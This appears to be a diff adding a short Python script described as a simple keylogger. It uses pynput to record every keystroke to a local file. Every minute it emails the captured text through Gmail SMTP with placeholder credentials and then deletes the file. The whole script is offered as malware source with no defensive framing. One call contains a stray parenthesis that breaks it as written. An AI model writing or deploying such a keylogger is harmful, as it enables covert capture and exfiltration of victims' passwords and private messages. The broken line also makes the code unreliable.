@@ -1,0 +1,41 @@
+"""
+Script : Simple keylogger
+Action : Records keystrokes and saves them to a file
+Version: 1.0
+Author : Jwills
+
+"""
+
+import pynput.keyboard
+import threading
+import smtplib
+import os
+
+def on_key_press(key):
+    try:
+        with open("keylog.txt", "a") as f:
+            f.write(str(key.char))
+    except AttributeError:
+        with open("keylog.txt", "a") as f:
+            f.write(" " + str(key) + " ")
+
+def send_email(email, password, to_email, subject, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    email_message = f"Subject: {subject}\n\n{message}"
+    server.sendmail(email, to_email, email_message)
+    server.quit()
+
+def report():
+    with open("keylog.txt", "r") as f:
+        data = f.read()
+    send_email("your email here"), "your password here", "to email here", "Keylogger Report", data)
+    os.remove("keylog.txt") 
+    
+    timer = threading.Timer(60, report)
+    timer.start()       
+listener = pynput.keyboard.Listener(on_press=on_key_press)
+with listener:
+    report()
+    listener.join()
